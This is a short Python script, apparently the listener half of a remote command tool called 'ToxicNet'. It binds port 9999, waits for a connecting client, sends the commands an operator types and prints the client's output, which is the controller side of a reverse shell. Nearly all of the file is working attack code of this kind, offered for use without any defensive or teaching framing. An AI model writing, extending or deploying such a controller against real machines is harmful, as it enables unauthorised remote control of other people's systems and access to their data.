import socket, sys, os

def create_socket():
    try:
        global host_ip
        global port
        global sock

        host_ip = '' #This is your IP. You could leave it blank.
        port = 9999 
        sock = socket.socket()
    except:
        print("An error occured! ", str(socket.error))

def bind_socket():
    try:
        global host_ip
        global port
        global sock

        sock.bind((host_ip,port))
        sock.listen(5)
        print("Success in binding the socket! Port: ", port)
    except:
        print("Error in binding the socket: ", str(socket.error))
        

def accept():
    try:
        conn, address = sock.accept()
        print("Connection established!")
        send_cmd(conn)
        conn.close()
    except:
        print("An exception occured! ", str(socket.error))

def send_cmd(conn):
    while True:
        cmd = input("ToxicNet:>")
        if cmd == "exit" or cmd == "Exit":
            conn.send(str.encode(cmd))
            conn.close()
            sock.close()
            os._exit(0)
        elif len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            c_response = str(conn.recv(1024), "utf-8")
            print(c_response)

create_socket()
bind_socket()
accept()

